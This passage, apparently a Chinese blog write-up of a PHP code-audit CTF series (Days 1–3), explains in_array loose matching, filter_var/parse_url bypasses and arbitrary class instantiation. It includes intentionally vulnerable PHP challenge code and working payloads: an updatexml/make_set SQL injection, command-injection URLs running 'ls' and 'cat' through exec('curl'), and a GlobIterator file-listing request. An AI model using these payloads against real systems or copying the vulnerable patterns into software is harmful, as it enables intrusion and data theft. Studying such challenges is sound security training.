    <content type="html"><![CDATA[<h2 id="红日安全-代码审计Day1-in-array函数缺陷"><a href="#红日安全-代码审计Day1-in-array函数缺陷" class="headerlink" title="[红日安全]代码审计Day1 - in_array函数缺陷"></a>[红日安全]代码审计Day1 - in_array函数缺陷</h2><h2 id="一、关于in-array"><a href="#一、关于in-array" class="headerlink" title="一、关于in_array"></a>一、关于in_array</h2><ol><li><strong>定义和用法</strong></li></ol><p><strong>in_array()</strong> 函数搜索数组中是否存在指定的值。</p><blockquote><p><strong>注释：</strong>如果 <em>search</em> 参数是字符串且 <em>type</em> 参数被设置为 TRUE，则搜索区分大小写。</p></blockquote><ol start="2"><li><strong>语法</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(search,<span class="keyword">array</span>,type)</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/10/Y341Qx.png" alt="Y341Qx.png"><br>| 参数     | 描述                                                         |<br>| :——- | :———————————————————– |<br>| <em>search</em> | 必需。规定要在数组搜索的值。                                 |<br>| <em>array</em>  | 必需。规定要搜索的数组。                                     |<br>| <em>type</em>   | 可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。 |</p><blockquote><p>来源：<a href="http://www.W3school.com.cn;[PHP手册](https://www.php.net/parse_url)" target="_blank" rel="noopener">www.W3school.com.cn;[PHP手册](https://www.php.net/parse_url)</a></p></blockquote><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="https://s1.ax1x.com/2020/05/10/Y34tTe.png" alt="Y34tTe.png"><br>[day1-2]:()<br><img src="https://s1.ax1x.com/2020/05/10/Y348OK.png" alt="Y348OK.png"><br><strong>考察点：</strong></p><ul><li><strong>in_array</strong>绕过</li><li>使用拼接函数<strong>updatexml</strong>注入</li></ul><p>+++</p><h3 id="1-in-array绕过"><a href="#1-in-array绕过" class="headerlink" title="1.in_array绕过"></a>1.<strong>in_array</strong>绕过</h3><p>关键代码：</p><p><img src="https://s1.ax1x.com/2020/05/10/Y34lS1.png" alt="Y34lS1.png"></p><ul><li><strong>connect_error()</strong></li></ul><p><strong>(1)定义和用法</strong></p><p>mysqli_connect_error() 函数返回上一次连接错误的错误描述。</p><hr><p><strong>(2)语法</strong></p><p><code>mysqli_connect_error();</code></p><p><strong>(3)细节</strong></p><table><thead><tr><th align="left">返回值：</th><th>返回一个描述错误的字符串。如果没有错误发生则返回 NULL。</th></tr></thead><tbody><tr><td align="left">PHP 版本：</td><td>5+</td></tr></tbody></table><ul><li><strong>fetch_assoc()</strong></li></ul><p><strong>（1）定义和用法</strong></p><p>mysqli_fetch_assoc() 函数从结果集中取得一行作为关联数组。</p><p><strong>注释：</strong>该函数返回的字段名是区分大小写的。</p><hr><p><strong>（2）语法：</strong></p><p><code>mysqli_fetch_assoc(result);</code></p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>result</em></td><td align="left">必需。规定由 mysqli_query()、mysqli_store_result() 或 mysqli_use_result() 返回的结果集标识符。</td></tr></tbody></table><p><strong>（3）细节：</strong></p><table><thead><tr><th align="left">返回值：</th><th>返回代表读取行的关联数组。如果结果集中没有更多的行则返回 NULL。</th></tr></thead><tbody><tr><td align="left">PHP 版本：</td><td>5+</td></tr></tbody></table><p>+++</p><ul><li><strong>query()</strong></li></ul><p><strong>(1)定义和用法</strong></p><p>mysqli_query() 函数执行某个针对数据库的查询。</p><hr><p><strong>(2)语法</strong></p><p><code>mysqli_query(connection,query,resultmode);</code></p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>connection</em></td><td align="left">必需。规定要使用的 MySQL 连接。</td></tr><tr><td align="left"><em>query</em></td><td align="left">必需，规定查询字符串。</td></tr><tr><td align="left"><em>resultmode</em></td><td align="left">可选。一个常量。可以是下列值中的任意一个：MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）MYSQLI_STORE_RESULT（默认）</td></tr></tbody></table><p><strong>(3)细节</strong></p><table><thead><tr><th align="left">返回值：</th><th>针对成功的 SELECT、SHOW、DESCRIBE 或 EXPLAIN 查询，将返回一个 mysqli_result 对象。针对其他成功的查询，将返回 TRUE。如果失败，则返回 FALSE。</th></tr></thead><tbody><tr><td align="left">PHP 版本：</td><td>5+</td></tr><tr><td align="left">更新日志：</td><td>在 PHP 5.3.0 中新增了异步查询的功能。</td></tr></tbody></table><p>+++</p><ul><li><strong>num_rows()</strong></li></ul><p><strong>(1)定义和用法</strong></p><p>mysqli_num_rows() 函数返回结果集中行的数量。</p><hr><p><strong>(2)语法</strong></p><p><code>mysqli_num_rows(result);</code></p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>result</em></td><td align="left">必需。规定由 mysqli_query()、mysqli_store_result() 或 mysqli_use_result() 返回的结果集标识符。</td></tr></tbody></table><p><strong>(3)细节</strong></p><table><thead><tr><th align="left">返回值：</th><th>返回结果集中行的数量。</th></tr></thead><tbody><tr><td align="left">PHP 版本：</td><td>5+</td></tr></tbody></table><p>+++</p><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>在index.php文件中，第11行的<strong>if</strong>条件语句处可以看出，程序把用户的ID值存储在 <strong>$whitelist</strong> 数组中，然后将用户传入的 <strong>id</strong> 参数先经过config.php文件中定义的<strong>stop_hack函数</strong>过滤，然后再用 <strong>in_array</strong> 来判断用户传入的 <strong>id</strong> 参数是否在 <strong>$whitelist</strong> 数组中，如果不在，返回 id $id is not in whitelist. 如果在，那么执行SQL语句，最后返回查询的内容。这里 <strong>in_array</strong> 函数没有使用强匹配，所以是可以绕过的，例如： <strong>id=1’</strong> 是可以成功绕过 <strong>in_array</strong> 函数的。config.php文件中<strong>stop_hack函数</strong>，这是一个过滤函数，主要过滤了字符串拼接函数，导致我们没法直接通过union selct或者常见的hex()等方式来得到flag。</p><p>+++</p><h3 id="2-使用拼接函数updatexml注入"><a href="#2-使用拼接函数updatexml注入" class="headerlink" title="2. 使用拼接函数updatexml注入"></a>2. 使用拼接函数<strong>updatexml</strong>注入</h3><h5 id="关于UPDATEXML-XML-document-XPath-string-new-value"><a href="#关于UPDATEXML-XML-document-XPath-string-new-value" class="headerlink" title="关于UPDATEXML (XML_document, XPath_string, new_value);"></a>关于<strong>UPDATEXML (XML_document, XPath_string, new_value);</strong></h5><blockquote><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string(Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值</p></blockquote><p><strong>注：</strong>Updatexml函数有个特性，当 updatexml 查询的数据中包含特殊字符或者字母，就会报错，报错信息为特殊字符、字母及之后的内容，如：查询的数据为99panda，那么结果只会显示panda。</p><p>因此这里通过查询database(),返回数据库名，然后CONCAT将其字符串化。因为UpdateXml第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。</p><p>由于字符串拼接函数被过滤了，因此无法使用concat等函数构造语句，只能选择使用不常用的函数——make_set()函数。</p><h5 id="关于MAKE-SET-bits-str1-str2-…"><a href="#关于MAKE-SET-bits-str1-str2-…" class="headerlink" title="关于MAKE_SET(bits,str1,str2,…)"></a><strong>关于MAKE_SET(bits,str1,str2,…)</strong></h5><blockquote><p>返回一个设定值(含子字符串分隔字符串”,”字符)，在设置位的相应位的字符串。str1对应于位0，str2到第1位，依此类推。在str1，str1有NULL值，…那么不添加到结果。</p></blockquote><blockquote><p>参考：<a href="http://www.cnpanda.net/sec/276.html" target="_blank" rel="noopener">关于UPDATEXML和make_set()函数</a> </p></blockquote><p>因此，可构造本题的payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?id=4 and (select updatexml(1,make_set(3,'~',(select flag from flag)),1))</span><br></pre></td></tr></table></figure><p>+++</p><h2 id="红日安全-代码审计Day2-filter-var函数"><a href="#红日安全-代码审计Day2-filter-var函数" class="headerlink" title="[红日安全]代码审计Day2 -filter_var函数"></a>[红日安全]代码审计Day2 -filter_var函数</h2><h2 id="二、关于filter-var函数"><a href="#二、关于filter-var函数" class="headerlink" title="二、关于filter_var函数"></a>二、关于filter_var函数</h2><ol><li><strong>定义和用法</strong></li></ol><p>filter_var() 函数通过指定的过滤器过滤变量。</p><p>如果成功，则返回已过滤的数据，如果失败，则返回 false。</p><ol start="2"><li><strong>语法</strong></li></ol><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter<span class="constructor">_var(<span class="params">variable</span>, <span class="params">filter</span>, <span class="params">options</span>)</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">variable</td><td align="left">必需。规定要过滤的变量。(变量的值在过滤前，会被转换成字符串)</td></tr><tr><td align="left">filter</td><td align="left">可选。规定要使用的过滤器的 ID。</td></tr><tr><td align="left">options</td><td align="left">规定包含标志/选项的数组。检查每个过滤器可能的标志和选项。</td></tr></tbody></table><p><img src="https://s1.ax1x.com/2020/05/10/Y34YwD.png" alt="Y34YwD.png"></p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    $site_info = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/sec-redclub.com$/'</span>,$site_info[<span class="string">'host'</span>]))&#123;</span><br><span class="line">        exec(<span class="string">'curl "'</span>.$site_info[<span class="string">'host'</span>].<span class="string">'"'</span>, $result);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info['host']&#125; successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows='20' cols='90'&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> implode(<span class="string">' '</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>+++</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$flag = <span class="string">"HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>考察点：</strong></p><ul><li><strong>filter_var()</strong>绕过</li><li>远程命令执行</li></ul><h4 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h4><ol><li><strong>exec()</strong></li></ol><p>(PHP 4, PHP 5, PHP 7)</p><p>exec — 执行一个外部程序;</p><p>说明：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec ( string $command [, <span class="keyword">array</span> &amp;$output [, int &amp;$return_var ]] ) : string</span><br></pre></td></tr></table></figure><p><strong>exec()</strong> 执行 <code>command</code> 参数所指定的命令。</p><p><strong>参数：</strong></p><ul><li><p><strong>command</strong>：要执行的命令；</p></li><li><p><strong>output</strong>：如果提供了 <code>output</code> 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 <em>\n</em> 字符。 请注意，如果数组中已经包含了部分元素，<strong>exec()</strong> 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 <strong>exec()</strong> 函数之前 对数组使用 <a href="https://www.php.net/manual/zh/function.unset.php" target="_blank" rel="noopener">unset()</a> 函数进行重置。</p></li><li><p><strong>return_var</strong>:如果同时提供 <code>output</code> 和 <code>return_var</code> 参数， 命令执行后的返回状态会被写入到此变量。</p></li></ul><p><strong>返回值</strong></p><p>命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 <a href="https://www.php.net/manual/zh/function.passthru.php" target="_blank" rel="noopener">passthru()</a> 函数。</p><p>如果想要获取命令的输出内容， 请确保使用 <code>output</code> 参数。</p><p>+++</p><ol start="2"><li><strong>parse_url()</strong></li></ol><p>(PHP 4, PHP 5, PHP 7)</p><p>parse_url — 解析 URL，返回其组成部分。</p><p><strong>说明</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_url ( string `$url` [, int `$component` = <span class="number">-1</span> ] ) : [mixed](https:<span class="comment">//www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed)</span></span><br></pre></td></tr></table></figure><p>本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</p><p>本函数<em>不是</em>用来验证给定 URL 的合法性的，只是将其分解为下面列出的部分。不完整的 URL 也被接受，<strong>parse_url()</strong> 会尝试尽量正确地将其解析。</p><p><strong>参数</strong></p><ul><li><p><code>url</code></p><p>要解析的 URL。无效字符将使用 <em>_</em> 来替换。</p></li><li><p><code>component</code></p><p>指定 <strong><code>PHP_URL_SCHEME</code></strong>、 <strong><code>PHP_URL_HOST</code></strong>、 <strong><code>PHP_URL_PORT</code></strong>、 <strong><code>PHP_URL_USER</code></strong>、 <strong><code>PHP_URL_PASS</code></strong>、 <strong><code>PHP_URL_PATH</code></strong>、 <strong><code>PHP_URL_QUERY</code></strong> 或 <strong><code>PHP_URL_FRAGMENT</code></strong> 的其中一个来获取 URL 中指定的部分的 <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>。 （除了指定为 <strong><code>PHP_URL_PORT</code></strong> 后，将返回一个 <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a> 的值）。</p></li></ul><p><strong>返回值</strong></p><p>对严重不合格的 URL，<strong>parse_url()</strong> 可能会返回 <strong><code>FALSE</code></strong>。</p><p>如果省略了 <code>component</code> 参数，将返回一个关联数组 <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a>，在目前至少会有一个元素在该数组中。数组中可能的键有以下几种：</p><ul><li>scheme - 如 http</li><li>host</li><li>port</li><li>user</li><li>pass</li><li>path</li><li>query - 在问号 <em>?</em> 之后</li><li>fragment - 在散列符号 <em>#</em> 之后</li></ul><p>如果指定了 <code>component</code> 参数， <strong>parse_url()</strong> 返回一个 <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a> （或在指定为 <strong><code>PHP_URL_PORT</code></strong> 时返回一个 <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a>）而不是 <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a>。如果 URL 中指定的组成部分不存在，将会返回 <strong><code>NULL</code></strong>。</p><blockquote><p>参考：<a href="https://www.php.net/parse_url" target="_blank" rel="noopener">PHP手册</a></p></blockquote><p>+++</p><ol start="3"><li>preg_match</li></ol><p>(PHP 4, PHP 5, PHP 7)</p><p>preg_match — 执行匹配正则表达式</p><p><strong>说明</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match ( string `$pattern` , string `$subject` [, <span class="keyword">array</span> `&amp;$matches` [, int `$flags` = <span class="number">0</span> [, int `$offset` = <span class="number">0</span> ]]] ) : int</span><br></pre></td></tr></table></figure><p>   搜索<code>subject</code>与<code>pattern</code>给定的正则表达式的一个匹配.</p><p>+++</p><ol start="4"><li><strong>implode</strong></li></ol><p>(PHP 4, PHP 5, PHP 7)</p><p>   implode — 将一个一维数组的值转化为字符串</p><p><strong>说明</strong></p><p>   implode ( string <code>$glue</code> , array <code>$pieces</code> ) : string</p><p>   implode ( array <code>$pieces</code> ) : string</p><p>   用 <code>glue</code> 将一维数组的值连接为一个字符串。</p><blockquote><p><strong>Note</strong>:<br>因为历史原因，<strong>implode()</strong> 可以接收两种参数顺序，但是 <a href="https://www.php.net/manual/zh/function.explode.php" target="_blank" rel="noopener">explode()</a> 不行。不过按文档中的顺序可以避免混淆。</p></blockquote><p>+++</p><h4 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h4><p>通过GET方式得到url，并随后经过filter_var和parse_url函数过滤将值传给变量$site_info。程序使用 <strong>exec</strong> 函数来执行 <strong>curl</strong> 命令，规定当 <strong>url</strong> 参数的值以 <strong>sec-redclub.com</strong> 结尾时，才会执行 <strong>exec</strong> 函数。</p><p>首先构造payload绕过绕过 <strong>filter_var</strong> 的 <strong>FILTER_VALIDATE_URL</strong> 过滤器;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?url=demo://demo.com,sec-redclub.com</span><br><span class="line">OR</span><br><span class="line">http://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/</span><br></pre></td></tr></table></figure><p>绕过 <strong>parse_url</strong> 函数，并且满足 <strong>$site_info[‘host’]</strong> 的值以 <strong>sec-redclub.com</strong> 结尾，payload如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?url=demo://%22;ls;%23;sec-redclub.com:80/</span><br></pre></td></tr></table></figure><blockquote><p>参考<a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">绕过方法</a></p></blockquote><p>当我们直接用 <strong>cat f1agi3hEre.php</strong> 命令的时候，过不了 <strong>filter_var</strong> 函数检测，因为包含空格，具体payload如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?url=demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/</span><br></pre></td></tr></table></figure><p>+++</p><h2 id="红日安全-代码审计Day3-实例化任意对象漏洞"><a href="#红日安全-代码审计Day3-实例化任意对象漏洞" class="headerlink" title="[红日安全]代码审计Day3 -实例化任意对象漏洞"></a>[红日安全]代码审计Day3 -实例化任意对象漏洞</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'404'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">($class)</span></span>&#123;</span><br><span class="line"><span class="keyword">new</span> NotFound();</span><br><span class="line">&#125;</span><br><span class="line">);</span><br><span class="line">$classname = <span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) ? $_GET[<span class="string">'name'</span>] : <span class="keyword">null</span>;</span><br><span class="line">$param = <span class="keyword">isset</span>($_GET[<span class="string">'param'</span>]) ? $_GET[<span class="string">'param'</span>] : <span class="keyword">null</span>;</span><br><span class="line">$param2 = <span class="keyword">isset</span>($_GET[<span class="string">'param2'</span>]) ? $_GET[<span class="string">'param2'</span>] : <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(class_exists($classname))&#123;</span><br><span class="line">$newclass = <span class="keyword">new</span> $classname($param,$param2);</span><br><span class="line">var_dump($newclass);</span><br><span class="line">    <span class="keyword">foreach</span> ($newclass <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">        <span class="keyword">echo</span> $key.<span class="string">'=&gt;'</span>.$value.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>+++</p><p>补充：</p><ol><li><p><strong>__construct()</strong> </p><p>__construct() 函数创建一个新的 SimpleXMLElement 对象。</p><p>如果成功，则该函数返回一个对象。如果失败，则返回 false。</p></li></ol><p>+++</p><ol start="2"><li><strong>class_exists</strong></li></ol><p>(PHP 4, PHP 5, PHP 7)</p><p>class_exists — 检查类是否已定义</p><p><strong>说明</strong></p><p>class_exists ( string <code>$class_name</code> [, bool <code>$autoload</code> = true ] ) : bool</p><p>检查指定的类是否已定义。</p><p><strong>参数</strong></p><ul><li><p><code>class_name</code></p><p>类名。名字的匹配是不分区大小写的。</p></li><li><p><code>autoload</code></p><p>是否默认调用 <a href="https://www.php.net/manual/zh/language.oop5.autoload.php" target="_blank" rel="noopener">__autoload</a>。</p></li></ul><p><strong>返回值</strong></p><p>如果由 <code>class_name</code> 所指的类已经定义，此函数返回 <strong><code>TRUE</code></strong>，否则返回 <strong><code>FALSE</code></strong>。</p><p>+++</p><ol start="3"><li><strong>var_dump</strong></li></ol><p>(PHP 4, PHP 5, PHP 7)</p><p>var_dump — 打印变量的相关信息</p><p><strong>说明</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump ( mixed $expression [, mixed $... ] ) : void</span><br></pre></td></tr></table></figure><p>此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p><p>In PHP 5 all public, private and protected properties of objects will be returned in the output.</p><p><strong>Tip</strong></p><p>和直接将结果输出到浏览器一样，可使用<a href="https://www.php.net/manual/zh/book.outcontrol.php" target="_blank" rel="noopener">输出控制函数</a>来捕获当前函数的输出，然后(例如)保存到一个 <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a> 中。</p><p><strong>参数</strong></p><ul><li><p><code>expression</code></p><p>你要打印的变量。</p></li></ul><p>+++</p><ol start="4"><li><strong><em>foreach</em></strong></li></ol><p>(PHP 4, PHP 5, PHP 7)</p><p><em>foreach</em> 语法结构提供了遍历数组的简单方式。<em>foreach</em> 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $value)</span><br><span class="line">    statement</span><br><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    statement</span><br></pre></td></tr></table></figure><p>第一种格式遍历给定的 <em>array_expression</em> 数组。每次循环中，当前单元的值被赋给 <em>$value</em> 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</p><p>第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 <em>$key</em>。</p><p>还能够自定义<a href="https://www.php.net/manual/zh/language.oop5.iterations.php" target="_blank" rel="noopener">遍历对象</a>。</p><p>+++</p><ol start="5"><li><strong>spl_autoload_register</strong></li></ol><p>(PHP 5 &gt;= 5.1.0, PHP 7)</p><p>spl_autoload_register — 注册给定的函数作为 __autoload 的实现</p><p><strong>说明</strong></p><p>spl_autoload_register ([ <a href="https://www.php.net/manual/zh/language.types.callable.php" target="_blank" rel="noopener">callable</a> <code>$autoload_function</code> [, bool <code>$throw</code> = true [, bool <code>$prepend</code> = false ]]] ) : bool</p><p>将函数注册到SPL __autoload函数队列中。如果该队列中的函数尚未激活，则激活它们。</p><p>如果在你的程序中已经实现了<a href="https://www.php.net/manual/zh/function.autoload.php" target="_blank" rel="noopener">__autoload()</a>函数，它必须显式注册到<a href="https://www.php.net/manual/zh/function.autoload.php" target="_blank" rel="noopener">__autoload()</a>队列中。因为 <strong>spl_autoload_register()</strong>函数会将Zend Engine中的<a href="https://www.php.net/manual/zh/function.autoload.php" target="_blank" rel="noopener">__autoload()</a>函数取代为<a href="https://www.php.net/manual/zh/function.spl-autoload.php" target="_blank" rel="noopener">spl_autoload()</a>或<a href="https://www.php.net/manual/zh/function.spl-autoload-call.php" target="_blank" rel="noopener">spl_autoload_call()</a>。</p><p>如果需要多条 autoload 函数，<strong>spl_autoload_register()</strong> 满足了此类需求。 它实际上创建了 autoload 函数的队列，按定义时的顺序逐个执行。相比之下， <a href="https://www.php.net/manual/zh/function.autoload.php" target="_blank" rel="noopener">__autoload()</a> 只可以定义一次。</p><p><strong>参数</strong></p><ul><li><p><code>autoload_function</code></p><p>欲注册的自动装载函数。如果没有提供任何参数，则自动注册 autoload 的默认实现函数<a href="https://www.php.net/manual/zh/function.spl-autoload.php" target="_blank" rel="noopener">spl_autoload()</a>。</p></li><li><p><code>throw</code></p><p>此参数设置了 <code>autoload_function</code> 无法成功注册时， <strong>spl_autoload_register()</strong>是否抛出异常。</p></li><li><p><code>prepend</code></p><p>如果是 true，<strong>spl_autoload_register()</strong> 会添加函数到队列之首，而不是队列尾部。</p></li></ul><p><strong>返回值</strong></p><p>成功时返回 <strong><code>TRUE</code></strong>， 或者在失败时返回 <strong><code>FALSE</code></strong>。</p><p>+++</p><p><strong>考察点：</strong></p><ul><li>实例化漏洞</li><li>XXE漏洞</li></ul><p>+++</p><h5 id="分析：-2"><a href="#分析：-2" class="headerlink" title="分析："></a>分析：</h5><p>使用 <strong>class_exists</strong> 函数来判断类是否存在，如果不存在的话，就会调用程序中的 <strong>__autoload</strong> 函数，但是这里没有 <strong>__autoload</strong> 函数，而是用 <strong>spl_autoload_register</strong> 注册了一个类似 <strong>__autoload</strong> 作用的函数，调用之前定义的<strong>NotFound</strong>函数输出404信息。</p><p>这里直接利用PHP的内置类，先用 <strong>GlobIterator</strong> 类搜索 <strong>flag文件</strong> 名字，来看一下PHP手册对 <strong>GlobIterator</strong> 类的 构造函数的定义：</p><p><img src="https://s1.ax1x.com/2020/05/10/Y34UFH.png" alt="Y34UFH.png"><br>第一个参数为要搜索的文件名，第二个参数为选择文件的哪个信息作为键名，这里我选择用 <strong>FilesystemIterator::CURRENT_AS_FILEINFO</strong> ，其对应的常量值为0.</p><p>构造搜索文件的payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/CTF/index.php?name=GlobIterator&amp;param=./*.php&amp;param2=0</span><br></pre></td></tr></table></figure><p>执行发现，flag的文件名为 <strong>f1agi3hEre.php</strong> ，接下来我们使用内置类 <strong>SimpleXMLElement</strong> 读取 <strong>f1agi3hEre.php</strong> 文件的内容,，这里我们要结合使用PHP流的使用，因为当文件中存在： <strong>&lt;   &gt;   &amp;   ‘   “</strong> 这5个符号时，会导致XML文件解析错误，所以我们这里利用PHP文件流，将要读取的文件内容经过 <strong>base64编码</strong> 后输出即可；</p><p>构造payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 